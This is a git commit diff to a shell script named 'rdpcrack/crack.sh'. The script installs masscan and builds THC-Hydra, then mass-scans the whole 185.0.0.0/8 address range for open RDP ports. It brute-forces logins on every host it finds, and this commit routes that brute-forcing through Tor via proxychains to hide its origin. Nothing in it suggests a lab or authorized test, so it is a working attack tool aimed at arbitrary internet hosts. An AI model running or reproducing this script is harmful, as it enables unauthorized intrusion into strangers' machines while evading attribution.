1bbd6f93d4300021935e9be43b57b32a496d1618
Remi Girard <54126451+independentcod@users.noreply.github.com>
2020-04-04 16:48:44 -0400

    Update crack.sh

--- rdpcrack/crack.sh
+++ rdpcrack/crack.sh
@@ -1,8 +1,10 @@
-sudo apt update && sudo apt install build-essential freerdp2-dev masscan libpcap-dev -y;
+sudo apt update && sudo apt install tor proxychains build-essential freerdp2-dev masscan libpcap-dev -y;
+sudo pkill tor;
+tor &
 git clone https://github.com/vanhauser-thc/thc-hydra.git;
 cd thc-hydra;
 ./configure && make -j8 && sudo make install;
 cd ..;
 sudo masscan --range 185.0.0.0-185.255.255.255 --rate 5000 -p3389 --open --banners -oG rdp.scan;
-for i in `grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" rdp.scan`; do hydra -vv rdp://$i -L user -P pass -t1 -W1 -I >hydra.log;
+for i in `grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" rdp.scan`; do proxychains hydra -vv rdp://$i -L user -P pass -t1 -W1 -I >hydra.log;
 done
